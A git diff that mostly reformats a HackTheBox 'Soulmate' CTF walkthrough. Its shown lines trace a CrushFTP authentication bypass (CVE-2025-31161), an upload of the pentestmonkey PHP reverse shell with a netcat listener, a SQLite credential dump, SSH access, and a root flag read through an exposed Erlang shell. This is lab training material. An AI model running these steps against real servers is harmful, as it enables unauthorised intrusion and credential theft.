@@ -1,10 +1,10 @@
 ---
-title: "Soulmate"
-date: "2025-09-21"
+title: 'Soulmate (HackTheBox) — Step-by-Step Walkthrough'
+date: '2025-09-21'
 draft: false
-tags: ["linux", "Machine", "Easy", "cve-2025-31161", "privilege-escalation", "HackTheBox" ]
-summary: "Compromise of a Linux HackTheBox machine via CVE-2025-31161 authentication bypass on CrushFTP to gain admin access, followed by PHP reverse shell upload, credential extraction from a hardcoded Erlang script, and root flag retrieval through an exposed Erlang shell on port 2222."
-images: ["/static/images/soulmate/preview.png"]
+tags: ['linux', 'Machine', 'Easy', 'cve-2025-31161', 'privilege-escalation', 'HackTheBox']
+summary: 'Compromise of a Linux HackTheBox machine via CVE-2025-31161 authentication bypass on CrushFTP to gain admin access, followed by PHP reverse shell upload, credential extraction from a hardcoded Erlang script, and root flag retrieval through an exposed Erlang shell on port 2222.'
+images: ['/static/images/soulmate/preview.png']
 ---
 
 # Soulmate Machine (HackTheBox) — Step-by-Step Walkthrough
@@ -13,14 +13,14 @@ images: ["/static/images/soulmate/preview.png"]
 
 # Machine info:
 
-| Machine Name | Difficulty | IP Address | OS |
-| --- | --- | --- | --- |
-| Soulmate | Easy | 10.10.11.86 | Linux |
+| Machine Name | Difficulty | IP Address  | OS    |
+| ------------ | ---------- | ----------- | ----- |
+| Soulmate     | Easy       | 10.10.11.86 | Linux |
 
 # Pinging:
 
 ```bash
-                                                                               
+
 ┌──(kali㉿kali)-[~]
 └─$ ping 10.10.11.86
 PING 10.10.11.86 (10.10.11.86) 56(84) bytes of data.
@@ -44,7 +44,7 @@ Not shown: 994 closed tcp ports (reset), 4 filtered tcp ports (no-response)
 Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
 |_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
 80/tcp open  http    nginx 1.18.0 (Ubuntu)
@@ -62,8 +62,8 @@ Two ports were open. With no credentials provided, I focused on the web service 
 
 ```bash
 ┌──(kali㉿kali)-[~]
-└─$ sudo nano /etc/hosts                                 
-[sudo] password for kali: 
+└─$ sudo nano /etc/hosts
+[sudo] password for kali:
 ```
 
 ![soulmate](/static/images/soulmate/image%201.png)
@@ -73,9 +73,9 @@ Two ports were open. With no credentials provided, I focused on the web service 
 ### Directory Discovery:
 
 ```bash
-                                                                                                                    
+
 ┌──(kali㉿kali)-[~/Desktop/HTB/Soulmate]
-└─$ gobuster dir -u http://soulmate.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt 
+└─$ gobuster dir -u http://soulmate.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
 ===============================================================
 Gobuster v3.6
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -99,9 +99,9 @@ Finished
 ```
 
 ```bash
-                                                                               
+
 ┌──(kali㉿kali)-[~]
-└─$ dirsearch -u 'http://soulmate.htb'    
+└─$ dirsearch -u 'http://soulmate.htb'
 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
   from pkg_resources import DistributionNotFound, VersionConflict
 
@@ -115,7 +115,7 @@ Output File: /home/kali/reports/http_soulmate.htb/_25-09-20_03-10-32.txt
 
 Target: http://soulmate.htb/
 
-[03:10:32] Starting: 
+[03:10:32] Starting:
 [03:12:11] 301 -  178B  - /assets  ->  http://soulmate.htb/assets/
 [03:12:12] 403 -  564B  - /assets/
 [03:12:38] 302 -    0B  - /dashboard.php  ->  /login
@@ -141,14 +141,14 @@ This yielded nothing useful, so I moved on to subdomain enumeration.
 
 ```bash
 ┌──(kali㉿kali)-[~/Desktop/HTB]
-└─$ ffuf -u http://10.10.11.86 -H "Host: FUZZ.soulmate.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 4                                                        
+└─$ ffuf -u http://10.10.11.86 -H "Host: FUZZ.soulmate.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 4
 
-        /'___\  /'___\           /'___\       
-       /\ \__/ /\ \__/  __  __  /\ \__/       
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
-         \ \_\   \ \_\  \ \____/  \ \_\       
-          \/_/    \/_/   \/___/    \/_/       
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
 
        v2.1.0-dev
 ________________________________________________
@@ -179,9 +179,9 @@ I visited the **`http://ftp.soulmate.htb`**
 
 ![soulmate](/static/images/soulmate/image%204.png)
 
-I tried loggin with the common default creds as well as the creds set on the [**`http://soulmate.htb`](http://soulmate.htb)** but it didn’t worked.
+I tried loggin with the common default creds as well as the creds set on the [\*\*`http://soulmate.htb`](http://soulmate.htb)\*\* but it didn’t worked.
 
-I then Looked the soorce and found the version of the **`WebInterface`** 
+I then Looked the soorce and found the version of the **`WebInterface`**
 
 ```bash
 src="/WebInterface/new-ui/assets/app/components/loader2.js?v=11.W.657-2025_03_08_07_52
@@ -203,7 +203,7 @@ I cloned the repo
 
 ```bash
 ┌──(kali㉿kali)-[~/Desktop/HTB]
-└─$ git clone https://github.com/Immersive-Labs-Sec/CVE-2025-31161.git           
+└─$ git clone https://github.com/Immersive-Labs-Sec/CVE-2025-31161.git
 Cloning into 'CVE-2025-31161'...
 remote: Enumerating objects: 9, done.
 remote: Counting objects: 100% (9/9), done.
@@ -211,10 +211,10 @@ remote: Compressing objects: 100% (9/9), done.
 remote: Total 9 (delta 3), reused 4 (delta 0), pack-reused 0 (from 0)
 Receiving objects: 100% (9/9), 6.02 KiB | 684.00 KiB/s, done.
 Resolving deltas: 100% (3/3), done.
-                                                                                                                     
+
 ┌──(kali㉿kali)-[~/Desktop/HTB]
-└─$ cd CVE-2025-31161 
-                                                                                                                     
+└─$ cd CVE-2025-31161
+
 ┌──(kali㉿kali)-[~/Desktop/HTB/CVE-2025-31161]
 └─$ ls
 cve-2025-31161.py  LICENSE  README.md
@@ -261,10 +261,9 @@ Successful Login:
 
 I opened **`User Manager`**, saw I could change any user’s password, changed **ben**’s password, and then login into **`ben**’s` account with the new credentials.
 
-
 ![soulmate](/static/images/soulmate/Screenshot_2025-09-20_184300%201.png)
 
-I Logedin the ben user account 
+I Logedin the ben user account
 
 ![soulmate](/static/images/soulmate/image%206.png)
 
@@ -272,15 +271,14 @@ While exploring Ben’s account, I noticed an option to **`upload files into the
 
 ![soulmate](/static/images/soulmate/image%207.png)
 
-
-I used the GitHub repo to prepare a `shell.php` reverse shell, uploaded it to the **`WebProb**` directory, started a listener on my machine, then accessed the uploaded `shell.php` to get a reverse shell.
+I used the GitHub repo to prepare a `shell.php` reverse shell, uploaded it to the **`WebProb**`directory, started a listener on my machine, then accessed the uploaded`shell.php` to get a reverse shell.
 
 [GitHub - pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/tree/master)
 
 ```bash
-                                                                                     
+
 ┌──(kali㉿kali)-[~/Desktop/HTB/CVE-2025-31161]
-└─$ git clone https://github.com/pentestmonkey/php-reverse-shell.git        
+└─$ git clone https://github.com/pentestmonkey/php-reverse-shell.git
 Cloning into 'php-reverse-shell'...
 remote: Enumerating objects: 10, done.
 remote: Counting objects: 100% (4/4), done.
@@ -288,10 +286,10 @@ remote: Compressing objects: 100% (3/3), done.
 remote: Total 10 (delta 1), reused 1 (delta 1), pack-reused 6 (from 1)
 Receiving objects: 100% (10/10), 9.81 KiB | 77.00 KiB/s, done.
 Resolving deltas: 100% (2/2), done.
-                                                                                     
+
 ┌──(kali㉿kali)-[~/Desktop/HTB/CVE-2025-31161]
-└─$ cd php-reverse-shell 
-                                                                                     
+└─$ cd php-reverse-shell
+
 ┌──(kali㉿kali)-[~/Desktop/HTB/CVE-2025-31161/php-reverse-shell]
 └─$ ls
 CHANGELOG    COPYING.PHP-REVERSE-SHELL  php-reverse-shell.php
@@ -300,16 +298,13 @@ COPYING.GPL  LICENSE                    README.md
 
 ![soulmate](/static/images/soulmate/image%208.png)
 
-
 Before uploading, open the php file and replace the placeholder LHOST/LPORT with your machine's IP and listener port.
 
 ### **File Upload:**
 
 ![soulmate](/static/images/soulmate/image%209.png)
 
-
 ![soulmate](/static/images/soulmate/image%2010.png)
-
 
 Before running `curl`, make sure your listener is started and actively listening for connections.
 
@@ -323,12 +318,12 @@ Got the reverse Shell.
 $  python3 -c 'import pty; pty.spawn("/bin/bash")'
 www-data@soulmate:/$ ^Z
 zsh: suspended  nc -lvnp 1234
-                                                                                              
+
 ┌──(kali㉿kali)-[~/Desktop/HTB/CVE-2025-31161/php-reverse-shell]
 └─$ stty raw -echo; fg
 [1]  + continued  nc -lvnp 1234
 
-www-data@soulmate:/$ 
+www-data@soulmate:/$
 ```
 
 I checked the shell I got but found nothing useful, so I used my go-to enumerator `linpeas.sh`.
@@ -354,12 +349,12 @@ total 24K
 drwxrwxr-x 2 www-data www-data 4.0K Sep 21 10:39 .
 drwxr-xr-x 6 root     root     4.0K Aug 10 10:39 ..
 -rw-rw-r-- 1 www-data www-data  16K Sep 21 10:39 soulmate.db
-www-data@soulmate:~/soulmate.htb/data$ mysql soulmate.db 
+www-data@soulmate:~/soulmate.htb/data$ mysql soulmate.db
 Command 'mysql' not found, but can be installed with:
 apt install mysql-client-core-8.0     # version 8.0.43-0ubuntu0.22.04.1, or
 apt install mariadb-client-core-10.6  # version 1:10.6.22-0ubuntu0.22.04.1
 Ask your administrator to install one of them.
-www-data@soulmate:~/soulmate.htb/data$ file soulmate.db 
+www-data@soulmate:~/soulmate.htb/data$ file soulmate.db
 soulmate.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 5, database pages 4, cookie 0x1, schema 4, UTF-8, version-valid-for 5
 www-data@soulmate:~/soulmate.htb/data$ sqlite3 soulmate.db
 SQLite version 3.37.2 2022-01-06 13:25:41
@@ -368,7 +363,7 @@ sqlite> .tables
 users
 sqlite> select * from users;
 1|admin|$2y$12$u0AC6fpQu0MJt7uJ80tM.**Oh4lEmCMgvBs3PwNNZIR7lor05ING3v**2|1|Administrator|||||2025-08-10 13:00:08|2025-08-10 12:59:39
-sqlite> 
+sqlite>
 ```
 
 ![soulmate](/static/images/soulmate/image%2015.png)
@@ -391,9 +386,9 @@ The Creds worked and i successfullly logined via ssh
 ```bash
 ┌──(kali㉿kali)-[~/Desktop/HTB/CVE-2025-31161]
 └─$ ssh ben@10.10.11.86
-ben@10.10.11.86's password: 
+ben@10.10.11.86's password:
 Last login: Sun Sep 21 11:26:46 2025 from 10.10.16.77
-ben@soulmate:~$ 
+ben@soulmate:~$
 ```
 
 # User Flag
@@ -401,12 +396,12 @@ ben@soulmate:~$
 ```bash
 ben@soulmate:~$ ls
 user.txt
-ben@soulmate:~$ cat user.txt 
+ben@soulmate:~$ cat user.txt
 ff250dd50e6d4fae42bc4108763896df
-ben@soulmate:~$ 
+ben@soulmate:~$
 ```
 
-User Flag : **`ff250dd50e6d4fae42bc4108763896df`** 
+User Flag : **`ff250dd50e6d4fae42bc4108763896df`**
 
 ---
 
@@ -416,7 +411,7 @@ ben dont have sudo access
 
 ```bash
 ben@soulmate:~$ sudo -l
-[sudo] password for ben: 
+[sudo] password for ben:
 Sorry, user ben may not run sudo on soulmate.
 ```
 
@@ -428,7 +423,7 @@ Found nothing useful so far, so I decided to run `linpeas.sh`
 
 ![soulmate](/static/images/soulmate/image%2018.png)
 
-Nmap showed only two *standard* open ports (80 and 22), but I also found these extra ports:
+Nmap showed only two _standard_ open ports (80 and 22), but I also found these extra ports:
 
 **`8448`, `2222`, `4369`, `53`, `9090`, `33907`, `34495`**.
 
@@ -441,12 +436,12 @@ ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
 This key is not known by any other names
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
 Warning: Permanently added '[localhost]:2222' (ED25519) to the list of known hosts.
-ben@localhost's password: 
+ben@localhost's password:
 Eshell V15.2.5 (press Ctrl+G to abort, type help(). for help)
-(ssh_runner@soulmate)1> 
+(ssh_runner@soulmate)1>
 ```
 
-This is a Eshell 
+This is a Eshell
 
 ```bash
 (ssh_runner@soulmate)9> os:cmd("cat /root/root.txt").
